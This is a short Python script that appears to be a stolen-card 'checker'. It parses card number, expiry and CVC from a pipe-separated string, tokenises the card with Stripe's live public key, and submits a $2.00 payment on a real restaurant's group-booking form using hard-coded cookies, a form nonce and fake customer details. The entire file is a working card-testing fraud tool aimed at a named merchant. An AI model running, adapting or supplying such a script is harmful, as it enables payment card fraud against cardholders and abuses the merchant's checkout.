import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2Fb85ba7b837%3B+stripe-js-v3%2Fb85ba7b837%3B+card-element&key=pk_live_51Mt7dzJqVFarYYzkkoB1jYzy4Ww7asPvFDmExt6qaF0JMR0zSKnT9dFWvsr9gh7SJC5k8cPRuygTHlhy2rXYu7tD00TryATqUc'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    '_ga': 'GA1.1.1372696206.1744538847',
	    '__stripe_mid': 'ab0dbb48-1da1-464e-af6e-3ce01a5116b3078144',
	    '_lscache_vary': '78bb02d9c957d5e27f252579e6901c6b',
	    '__stripe_sid': '89de99bc-3fa1-4134-9db5-5a7bf81dd9f78883fd',
	    '_ga_RBF17DZGXR': 'GS1.1.1745647265.7.1.1745647363.0.0.0',
	}
	
	headers = {
	    'authority': 'couqley.ae',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '_ga=GA1.1.1372696206.1744538847; __stripe_mid=ab0dbb48-1da1-464e-af6e-3ce01a5116b3078144; _lscache_vary=78bb02d9c957d5e27f252579e6901c6b; __stripe_sid=89de99bc-3fa1-4134-9db5-5a7bf81dd9f78883fd; _ga_RBF17DZGXR=GS1.1.1745647265.7.1.1745647363.0.0.0',
	    'origin': 'https://couqley.ae',
	    'referer': 'https://couqley.ae/group-booking/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1745647363998',
	}
	
	data = {
	    'data': '__fluent_form_embded_post_id=1149&_fluentform_7_fluentformnonce=b6d8950b1a&_wp_http_referer=%2Fgroup-booking%2F&names%5Bfirst_name%5D=Rodam&names%5Blast_name%5D=User&email=rodamuser08%40gmail.com&phone=0817480671&dropdown_1=Birthday%20Celebration&dropdown=Couqley&no_of_people=12&datetime=30%2F04%2F2025%2012%3A00%20PM&food_package=179&drinks_package=0&payment_options=Free%20Cancellation%202%20weeks&grand_total=2148&grand_total_1=179&custom-payment-amount_1=2.00&payment_method=stripe&food_canape%5B%5D=&checkbox%5B%5D=&food_coffee%5B%5D=&__stripe_payment_method_id='+str(pm)+'',
	    'action': 'fluentform_submit',
	    'form_id': '7',
	}
	
	r2 = requests.post('https://couqley.ae/wp-admin/admin-ajax.php', params=params, cookies=cookies, headers=headers, data=data)
	
	return (r2.json())
